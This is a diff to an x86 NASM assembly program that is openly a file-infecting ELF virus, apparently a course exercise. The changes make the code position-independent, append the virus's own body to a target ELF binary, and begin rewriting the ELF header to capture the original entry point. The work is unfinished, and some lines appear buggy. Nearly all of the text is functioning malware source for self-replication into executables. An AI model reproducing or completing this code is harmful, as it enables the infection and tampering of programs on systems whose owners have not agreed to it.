@@ -58,18 +58,48 @@ global _start
 ;;;;;;;;;;;;;;;;;;;;;;;;;
 
 %macro print_OutStr 0
-;write 1, infectionStr, OutStr_len
-write 1, OutStr, OutStr_len
+	pushad
+	get_symbal_rt_address_to_ecx OutStr
+	mov ebx, ecx
+	get_symbal_rt_address_to_ecx OutStr_len 
+	write 1, ebx, ecx
+	popad
+	;write 1, OutStr, OutStr_len
 %endmacro
 
 %macro print_Failstr 0
-write 1, Failstr, Failstr_len
+	pushad
+	get_symbal_rt_address_to_ecx Failstr
+	mov ebx, ecx
+	get_symbal_rt_address_to_ecx Failstr_len 
+	write 1, ebx, ecx
+	popad
+	;write 1, Failstr, Failstr_len
 %endmacro
 
 %macro print_openFail 0
-write 1, OpenErrStr, OpenErrStr_len
+	pushad
+	get_symbal_rt_address_to_ecx OpenErrStr
+	mov ebx, ecx
+	get_symbal_rt_address_to_ecx OpenErrStr_len 
+	write 1, ebx, ecx
+	popad
+	;write 1, OpenErrStr, OpenErrStr_len
 %endmacro
 
+%macro get_symbal_rt_address_to_ecx 1
+	call get_my_loc
+    mov edx, next_i                     
+    sub edx, %1                   
+    sub ecx, edx   
+%endmacro
+
+%macro reset_regs 0
+	mov eax, 0
+	mov ebx, 0
+	mov ecx, 0
+	mov edx, 0
+%endmacro
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;
 	section .text
@@ -79,6 +109,9 @@ _start:
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;CODE START
 	pushad
+	
+	print_OutStr ; printing the outstr
+	
 	open FileName,RDWR,0777
 	mov [ebp-4], eax  ;save fd in local vars
 	cmp dword[ebp-4], -1
@@ -95,19 +128,45 @@ _start:
     cmp byte[ecx+3],'F'; elfmago3
     jne VirusExit_with_err;
 
-	print_OutStr
+	print_OutStr ; printing the outstr
 
-	.infect:
+	.infection:
 	lseek dword[ebp-4], 0, SEEK_END ; get to end of file
-	; set up len in bytes of printing code in edx
-	mov edx, virus_end
-	sub edx, _start
-	write dword[ebp-4], _start, edx ; write the print command
+	; get to ecx virus_end real time address
+	get_symbal_rt_address_to_ecx virus_end
+	mov ebx, ecx
+	get_symbal_rt_address_to_ecx _start
+	sub ebx, ecx
+	write dword[ebp-4], ecx, ebx ; write the print command
+	
+	.rewrite_elfheader:
+	lseek dword[ebp-4],0,SEEK_SET;getting the file bact to begin point
+    ;cmp eax,0
+	;jl VirusExit_with_err; jump if less than 0 or equal
 
-	.print_OutStr:
-		
-		close [ebp-4]
-		jmp VirusExit
+	; Rewriting the original ELF header
+	; Copy original Elf header to stack 
+	read dword[ebp-4],[ebp-60],ELFHDR_size; elf header of size 52, 8 bytes from epb already in use
+    ;save old entry point
+	mov ebx, dword[ebp-60+ENTRY] ; begining of elf header on stack + ENTRY offset
+	mov dword[ebp-64], ecx ; Save old entry to [ebp-64]
+
+	reset_regs
+
+	; Update file size - file size is in program header table
+	;lseek dword[ebp-4], ELFHDR_phoff, SEEK_SET  
+
+	mov eax, [ebp-60+ELFHDR_phoff] ; now [eax] is begining offset of program header
+	mov eax, [eax] ;now eax is program header offset 
+
+
+
+
+
+
+
+	.beforeEnd:	
+	close [ebp-4]
 
 
 
